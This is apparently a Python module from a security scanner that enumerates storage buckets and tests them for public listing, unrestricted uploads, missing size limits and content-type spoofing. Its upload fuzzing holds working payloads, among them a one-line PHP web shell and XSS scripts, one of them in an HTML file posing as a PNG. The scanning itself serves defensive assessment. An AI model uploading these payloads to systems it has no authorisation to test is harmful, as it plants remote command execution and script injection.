from typing import List ,Dict 
from ssf.core .base import BaseScanner 
from ssf.core .config import Wordlists 
class StorageScanner (BaseScanner ):
    async def scan (self )->List [Dict ]:
        results =[]
        common_buckets =Wordlists .buckets 

        if self .client .config .level >=2 :
            common_buckets .extend (["backup","database","archive","old","temp","staging","dev","prod"])

        for bucket in common_buckets :
            self .log (f"[*] Checking storage bucket: {bucket }","cyan")
            url =f"/storage/v1/bucket/{bucket }"
            try :
                r =await self .client .get (url )
                if r .status_code ==200 :
                    list_url =f"/storage/v1/object/list/{bucket }"
                    r_list =await self .client .post (list_url ,json ={"prefix":"","limit":1 })
                    is_public =r_list .status_code ==200 
                    bucket_info ={
                    "name":bucket ,
                    "exists":True ,
                    "public":is_public ,
                    "vulnerabilities":[]
                    }
                    self .log (f"    [+] Found bucket: {bucket } (Public: {is_public })","green")
                    await self ._test_upload_fuzzing (bucket ,bucket_info )
                    await self ._test_size_limit (bucket ,bucket_info )
                    await self ._test_content_type_spoofing (bucket ,bucket_info )
                    results .append (bucket_info )
            except Exception as e :
                self .log_error (e )
        return results 
    async def _test_upload_fuzzing (self ,bucket :str ,info :Dict ):
        dangerous_files ={
        "exploit.html":"<html><script>alert(1)</script></html>",
        "shell.php":"<?php system($_GET['cmd']); ?>",
        "malware.exe":"MZ..."
        }

        if self .client .config .level >=3 :
            dangerous_files .update ({
            "test.jsp":"<% out.println('test'); %>",
            "test.asp":"<% Response.Write('test') %>",
            "test.svg":"<svg onload=alert(1)>",
            "config.json":'{"test": "value"}'
            })
        for fname ,content in dangerous_files .items ():
            try :
                path =f"ssf_test/{fname }"
                url =f"/storage/v1/object/{bucket }/{path }"
                r =await self .client .post (url ,files ={"file":(fname ,content ,"text/plain")})
                if r .status_code in [200 ,201 ]:
                    self .log (f"    [!] DANGEROUS: Uploaded {fname } to {bucket }!","bold red")
                    info ["vulnerabilities"].append (f"Unrestricted Upload ({fname })")
                    await self .client .delete (url )
            except Exception as e :
                self .log_error (e )
    async def _test_size_limit (self ,bucket :str ,info :Dict ):
        try :
            path ="ssf_test/large_test.bin"
            url =f"/storage/v1/object/{bucket }/{path }"
            def data_gen ():
                for _ in range (1024 ):
                    yield b"A"*10240 
            content =b"A"*(1024 *1024 )
            r =await self .client .post (url ,files ={"file":("large.bin",content ,"application/octet-stream")})
            if r .status_code in [200 ,201 ]:
                self .log (f"    [!] WARNING: Uploaded 1MB file to {bucket } (No strict quota detected)","yellow")
                info ["vulnerabilities"].append ("Potential DoS (No Size Limit detected on 1MB)")
                await self .client .delete (url )
        except Exception as e :
            self .log_error (e )
    async def _test_content_type_spoofing (self ,bucket :str ,info :Dict ):
        try :
            fname ="spoof.png"
            content ="<html><script>alert('XSS')</script></html>"
            url =f"/storage/v1/object/{bucket }/ssf_test/{fname }"
            files ={"file":(fname ,content ,"image/png")}
            r =await self .client .post (url ,files =files )
            if r .status_code in [200 ,201 ]:
                self .log (f"    [!] SPOOFING: Uploaded HTML as image/png to {bucket }","bold red")
                info ["vulnerabilities"].append ("Content-Type Spoofing (HTML as PNG)")
                await self .client .delete (url )
        except Exception as e :
            self .log_error (e )